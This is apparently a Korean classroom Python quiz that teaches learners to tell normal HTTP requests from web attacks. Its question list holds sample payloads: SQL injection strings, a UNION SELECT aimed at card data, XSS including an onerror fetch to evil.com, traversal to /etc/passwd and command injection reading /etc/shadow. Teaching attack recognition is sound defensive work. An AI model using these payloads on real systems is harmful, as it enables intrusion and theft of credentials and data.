"""
실습 2: 웹 공격 탐지 퀴즈
========================
HTTP 요청을 보고 공격인지 정상인지 직접 판별해봅니다.
정답 확인 후 1교시 이론 내용을 복습합니다.

실행: python attack_quiz.py
"""

import random

# ============================================================
# 퀴즈 문제 (요청, 정답, 해설)
# ============================================================
QUIZ = [
    {
        "request": "GET /index.html HTTP/1.1",
        "answer": "정상",
        "explanation": "일반적인 웹 페이지 접근 요청입니다."
    },
    {
        "request": "GET /login?user=admin&pw=' OR '1'='1 HTTP/1.1",
        "answer": "SQL Injection",
        "explanation": "' OR '1'='1 은 SQL WHERE 절을 항상 참으로 만드는 대표적인 SQL Injection 패턴입니다."
    },
    {
        "request": "GET /products?category=shoes&page=2 HTTP/1.1",
        "answer": "정상",
        "explanation": "상품 카테고리 조회 요청으로, 파라미터에 이상한 패턴이 없습니다."
    },
    {
        "request": "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1",
        "answer": "XSS",
        "explanation": "<script> 태그를 검색어에 삽입하여 다른 사용자의 쿠키를 탈취하려는 XSS 공격입니다."
    },
    {
        "request": "GET /files/../../../etc/passwd HTTP/1.1",
        "answer": "Path Traversal",
        "explanation": "../를 반복하여 서버의 상위 디렉토리로 이동, /etc/passwd 파일에 접근하려는 경로 탐색 공격입니다."
    },
    {
        "request": "POST /api/users HTTP/1.1  body: {name: 'Kim', email: 'kim@test.com'}",
        "answer": "정상",
        "explanation": "일반적인 사용자 등록 API 요청입니다."
    },
    {
        "request": "GET /download?file=report.pdf; cat /etc/shadow HTTP/1.1",
        "answer": "Command Injection",
        "explanation": "; 뒤에 cat /etc/shadow 명령어를 삽입하여 서버의 비밀번호 파일을 읽으려는 명령어 인젝션 공격입니다."
    },
    {
        "request": "POST /comment HTTP/1.1  body: msg=<img src=x onerror=fetch('http://evil.com/steal')>",
        "answer": "XSS",
        "explanation": "img 태그의 onerror 이벤트를 악용한 XSS 공격입니다. 이미지 로드 실패 시 악성 코드가 실행됩니다."
    },
    {
        "request": "GET /api/products?id=5 UNION SELECT credit_card, cvv FROM payments HTTP/1.1",
        "answer": "SQL Injection",
        "explanation": "UNION SELECT로 다른 테이블(payments)의 신용카드 정보를 추출하려는 SQL Injection 공격입니다."
    },
    {
        "request": "GET /about HTTP/1.1",
        "answer": "정상",
        "explanation": "소개 페이지 접근으로 완전히 정상적인 요청입니다."
    },
]


def run_quiz():
    """퀴즈 실행"""
    print("=" * 65)
    print("  [퀴즈] HTTP 요청을 보고 공격 유형을 맞혀보세요!")
    print("=" * 65)
    print("  보기: 정상 / SQL Injection / XSS / Command Injection / Path Traversal")
    print("  (종료하려면 'q' 입력)\n")

    # 문제 섞기
    questions = QUIZ.copy()
    random.shuffle(questions)

    score = 0
    total = len(questions)

    for i, q in enumerate(questions, 1):
        print(f"  ─── 문제 {i}/{total} ───")
        print(f"  요청: {q['request']}")
        print()

        user_answer = input("  답: ").strip()
        if user_answer.lower() == 'q':
            total = i - 1
            break

        correct = q["answer"]
        if user_answer == correct or user_answer.lower() == correct.lower():
            print(f"  >> 정답! [{correct}]")
            score += 1
        else:
            print(f"  >> 오답! 정답은 [{correct}]")

        print(f"  >> 해설: {q['explanation']}")
        print()

    if total > 0:
        pct = score / total * 100
        print(f"\n{'=' * 65}")
        print(f"  결과: {score}/{total} ({pct:.0f}%)")

        if pct == 100:
            print("  >> 완벽합니다! 웹 보안 전문가 수준!")
        elif pct >= 70:
            print("  >> 좋습니다! 대부분의 공격을 잘 구분했습니다.")
        elif pct >= 50:
            print("  >> 보통입니다. 1교시 이론 내용을 다시 복습해보세요.")
        else:
            print("  >> 아쉽습니다. 각 공격의 핵심 키워드를 기억해두세요!")
        print(f"{'=' * 65}")


if __name__ == "__main__":
    run_quiz()
